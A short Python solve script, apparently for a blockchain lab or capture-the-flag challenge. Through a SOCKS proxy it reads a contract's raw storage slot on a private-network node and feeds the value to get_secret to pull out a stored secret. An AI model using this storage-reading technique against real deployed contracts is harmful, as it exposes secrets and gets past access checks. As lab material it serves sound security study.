

import socks
import socket
from web3 import Web3
socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 8123)
socket.socket = socks.socksocket

node_address = "http://192.168.2.99:50838"
web3 = Web3(Web3.HTTPProvider(node_address))

contract_address = "0x850EC3780CeDfdb116E38B009d0bf7a1ef1b8b38"  # Replace with actual address
contract_abi = [{"inputs": [], "stateMutability": "nonpayable", "type": "constructor"}, {"inputs": [{"internalType": "bytes32", "name": "_key", "type": "bytes32"}], "name": "get_secret", "outputs": [{"internalType": "string", "name": "", "type": "string"}], "stateMutability": "view", "type": "function"}, {"inputs": [{"internalType": "bytes32[3]", "name": "_data", "type": "bytes32[3]"}], "name": "set_data", "outputs": [], "stateMutability": "nonpayable", "type": "function"}, {"inputs": [{"internalType": "string", "name": "message", "type": "string"}], "name": "set_secret", "outputs": [], "stateMutability": "nonpayable", "type": "function"}]
contract = web3.eth.contract(address=contract_address, abi=contract_abi)
print(web3.is_connected())

storage_value = web3.eth.get_storage_at(contract_address, 2)
print("data[2] in storage (raw):", storage_value)

secret = contract.functions.get_secret(storage_value).call()
print("Secret:", secret)
